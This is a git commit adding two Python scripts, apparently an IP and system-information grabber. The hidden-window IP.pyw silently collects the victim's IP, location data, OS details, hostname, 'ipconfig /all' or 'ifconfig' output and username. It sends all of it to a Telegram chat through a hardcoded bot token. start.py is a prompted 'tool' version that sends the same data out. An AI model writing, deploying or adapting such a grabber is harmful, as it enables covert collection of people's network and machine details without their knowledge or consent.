6978e860e263b2b7f368729dbcdc52572ae3b879
LunarStone292 <93814414+LunarStone292@users.noreply.github.com>
2022-01-03 08:08:18 -0500

    Add files via upload

---
+++ IP.pyw
@@ -0,0 +1,42 @@
+from test import ip
+from IP_data import data
+import telepot
+import platform
+import getpass
+
+enjoy="enjoy ;)"
+
+TOKEN="2140343591:AAG3OwNwdSylSDnlP0s7civc7dEagQX8VaY"
+chat_id="-763819940"
+
+the_location_zone = "---------------localizzation---------------"
+
+
+
+bot=telepot.Bot(TOKEN)
+bot.sendMessage(chat_id,ip )
+bot.sendMessage(chat_id,'https://whatismyipaddress.com/' + ip )
+bot.sendMessage(chat_id,enjoy)
+bot.sendMessage(chat_id,the_location_zone)
+bot.sendMessage(chat_id,data)
+bot.sendMessage(chat_id,"--------------os-------------")
+bot.sendMessage(chat_id,"python version [] " + platform.python_version())
+bot.sendMessage(chat_id,"system [] " + platform.system())
+bot.sendMessage(chat_id,"versione [] " + platform.version())
+bot.sendMessage(chat_id,"rilascio [] " + platform.release())
+bot.sendMessage(chat_id,"macchina [] " + platform.machine())
+bot.sendMessage(chat_id,"processore [] " + platform.processor())
+bot.sendMessage(chat_id,"nome desktop [] " + platform.node())
+bot.sendMessage(chat_id,"piattaforma [] " + platform.platform())
+bot.sendMessage(chat_id,platform.uname())
+
+if(platform.system() == "Windows"):
+    import subprocess
+    proc = subprocess.check_output("ipconfig /all").decode('utf-8')
+    bot.sendMessage(chat_id,proc)
+if(platform.system() == "Linux"):
+    import subprocess
+    proc_1 = subprocess.check_output("ifconfig" ).decode('utf-8')
+    bot.sendMessage(chat_id,proc_1)
+
+bot.sendMessage(chat_id,getpass.getuser())
---
+++ start.py
@@ -0,0 +1,61 @@
+import platform
+print("\n'####:'########::")
+print(". ##:: ##.... ##:")
+print(": ##:: ##:::: ##:")
+print(": ##:: ########::")
+print(": ##:: ##.....:::")
+print(": ##:: ##::::::::")
+print("'####: ##::::::::")
+print("....::..:::::::::")
+
+input("press enter to continue... ")
+
+print("-------------------------------------")
+print("your ip-adress")
+print("-------------------------------------")
+from test import ip
+print("-------------------------------------")
+from IP_data import data
+print("LOADING... don't stop the process or shutdown the pc...")
+
+import telepot
+
+enjoy="enjoy ;)"
+
+TOKEN=input("inserisci il token: ")
+chat_id=input("inserisci il chat id: ")
+
+the_location_zone = "---------------localizzation---------------"
+
+
+
+bot=telepot.Bot(TOKEN)
+bot.sendMessage(chat_id,ip )
+bot.sendMessage(chat_id,'https://whatismyipaddress.com/' + ip )
+bot.sendMessage(chat_id,enjoy)
+bot.sendMessage(chat_id,the_location_zone)
+bot.sendMessage(chat_id,data)
+bot.sendMessage(chat_id,"--------------os-------------")
+bot.sendMessage(chat_id,"python version [] " + platform.python_version())
+bot.sendMessage(chat_id,"system [] " + platform.system())
+bot.sendMessage(chat_id,"versione [] " + platform.version())
+bot.sendMessage(chat_id,"rilascio [] " + platform.release())
+bot.sendMessage(chat_id,"macchina [] " + platform.machine())
+bot.sendMessage(chat_id,"processore [] " + platform.processor())
+bot.sendMessage(chat_id,"nome desktop [] " + platform.node())
+bot.sendMessage(chat_id,"piattaforma [] " + platform.platform())
+bot.sendMessage(chat_id,platform.uname())
+
+if(platform.system() == "Windows"):
+    import subprocess
+    proc = subprocess.check_output("ipconfig" ).decode('utf-8')
+    bot.sendMessage(chat_id,proc)
+if(platform.system() == "Linux"):
+    import subprocess
+    proc_1 = subprocess.check_output("ifconfig" ).decode('utf-8')
+    bot.sendMessage(chat_id,proc_1)
+bot.sendMessage(chat_id,getpass.getuser())
+
+print("\nthank you to have used my tool :-)")
+
+input("\n\n\n\n\npress enter to finish... ")
